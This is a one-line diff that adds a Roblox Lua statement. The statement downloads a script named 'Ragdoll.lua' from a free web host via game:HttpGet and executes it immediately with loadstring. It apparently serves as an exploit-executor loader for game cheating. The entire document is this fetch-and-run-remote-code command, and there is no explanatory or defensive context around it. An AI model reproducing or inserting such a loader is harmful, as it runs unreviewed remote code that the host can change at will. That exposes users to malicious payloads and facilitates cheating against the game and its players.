@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://lovlysystem.000webhostapp.com/scripts/Ragdoll.lua')))()
